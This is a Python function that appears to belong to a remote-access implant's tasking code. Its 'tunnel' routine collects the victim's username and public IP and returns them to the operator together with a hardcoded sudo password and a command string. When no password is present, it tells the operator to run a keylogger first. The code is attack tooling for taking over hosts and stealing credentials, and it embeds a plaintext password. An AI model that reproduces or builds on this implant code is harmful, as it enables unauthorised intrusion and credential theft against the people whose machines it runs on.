def tunnel(task_id, command):

    sudo = "bubiman10"

    ip = getPublicIP()
    print('My public IP address is: {}'.format(ip))

    if sudo != "":
        response = {
            'task_id': task_id,
            "user_output": getpass.getuser() + "@" + ip + ";" + sudo + ";" + command,
            'completed': True
        }
        responses.append(response)

    else:
        response = {
            'task_id': task_id,
            "user_output": "Sudo password not acquired. Try using keylog first. " + getpass.getuser() + "@" + ip + ";" + sudo + ";" + command,
            'completed': True
        }
        responses.append(response)

    print("\t- Tunnel Done")

    return